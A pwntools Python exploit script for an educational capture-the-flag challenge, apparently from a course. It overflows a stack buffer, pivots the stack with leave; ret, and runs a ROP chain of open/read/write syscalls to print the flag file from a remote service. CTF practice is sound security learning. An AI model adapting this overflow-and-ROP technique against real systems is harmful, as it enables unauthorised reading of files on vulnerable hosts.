from pwn import *

url = 'edu-ctf.zoolab.org' 
port = 10005

#s = process('./chal')
s = remote(url,port)
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
fn_addr = 0x4e3340
ROP_addr = 0x4e3360

pop_rdi = 0x4038b3 # pop rdi ; ret
pop_rsi = 0x402428 # pop rsi ; ret
pop_rdx = 0x493a2b # pop rdx ; pop rbx ; ret
pop_rax = 0x45db87 # pop rax ; ret
syscall = 0x4284b6 # syscall ; ret
leave_ret = 0x40190c # leave ; ret
ret = 0x40101a # ret
#fd = open("flag", 0);
#read(fd, buf, 0x30);
#write(1, buf, 0x30); // 1 --> stdout
ROP = flat(
    pop_rsi, 0,
    pop_rdi, fn_addr,
    pop_rax, 2,
    syscall,

    pop_rdi, 3,
    pop_rsi, fn_addr,
    pop_rdx, 0x30, 0x0,
    pop_rax, 0,
    syscall,

    pop_rdi, 1,
    pop_rax, 1,
    syscall,
)
#s.sendafter(b"Give me filename: ",b'/home/heisenberg/flag\x00')
s.sendafter(b"Give me filename: ",b'/home/chal/flag')
s.sendafter(b"Give me ROP: ", b'A'*0x8 + ROP)


#gdb.attach(s)
s.sendafter(b"Give me overflow: ",b'A'*32 + p64(ROP_addr) + p64(leave_ret))
print(s.recv())